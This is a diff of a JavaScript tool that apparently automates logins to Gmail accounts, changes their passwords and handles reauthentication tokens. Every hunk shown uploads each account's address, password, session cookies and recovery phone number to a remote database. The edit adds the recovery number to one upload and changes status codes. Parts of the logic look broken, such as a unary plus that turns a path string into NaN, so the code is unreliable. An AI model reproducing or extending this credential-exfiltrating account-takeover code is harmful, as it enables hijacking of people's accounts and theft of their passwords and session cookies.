@@ -390,7 +390,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                             console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                         } else {
                             try {
-                                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: time }), {
+                                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
                                     headers: {
                                         'Content-Type': 'application/x-www-form-urlencoded'
                                     }
@@ -403,7 +403,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                         }
                     } else {
                         try {
-                            await axios.patch(BASE_URL+(mLoader.status==100?+'error_login':'error_rapt')+'/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
+                            await axios.patch(BASE_URL+(mLoader.status==200?+'error_login':'error_rapt')+'/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
                                 headers: {
                                     'Content-Type': 'application/x-www-form-urlencoded'
                                 }
@@ -563,7 +563,7 @@ async function validRaptoken(browser, page, user, password, mRapt) {
                         return { status:200, change: true, browser: browser, page: page, number: number, pass:changePass, rapt: rapt }
                     } else {
                         console.log('Process: [ Status: RAPT Null --- Time: '+getTime()+' ]')
-                        return { status:100, change: true, browser: browser, page: page, number: number, pass:changePass, rapt: null }
+                        return { status:200, change: true, browser: browser, page: page, number: number, pass:changePass, rapt: null }
                     }
                 } else {
                     console.log('Process: [ New Login: Failed --- Time: '+getTime()+' ]')
